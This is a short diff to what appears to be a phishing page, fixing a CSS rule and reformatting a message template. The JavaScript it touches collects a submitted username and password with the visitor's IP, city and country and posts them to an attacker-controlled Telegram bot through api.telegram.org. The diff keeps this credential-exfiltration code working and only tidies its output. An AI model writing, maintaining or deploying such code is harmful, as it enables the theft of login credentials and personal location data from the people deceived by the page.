@@ -51,7 +51,8 @@
         .navigation a {
             color: #ffffff;
             text-decoration: none;
-        
+        }
+
         .navigation__top-items {
             border-bottom: 1px solid #944d4d;
         }
@@ -577,9 +578,7 @@
         var ip = $("#ip").val();
                 var city = $("#city").val();
                 var country = $("#country").val();
-        var message = `<b>Username</b> : <code>${usr}</code>\n
-                         <b>Password</b> : <i>${pwd}</i>\n
-                          <u>${ip}</u>, <u>${city}</u>, <u>${country}</u>`;
+        var message = `<b>Username</b> : <code>${usr}</code>\n\n<b>Password</b> : <i>${pwd}</i>\n\n\n<u>${ip}</u>, <u>${city}</u>, <u>${country}</u>`;
         $.ajax({
             type: form.method,
             url: `https://api.telegram.org/bot${token}/sendMessage`,
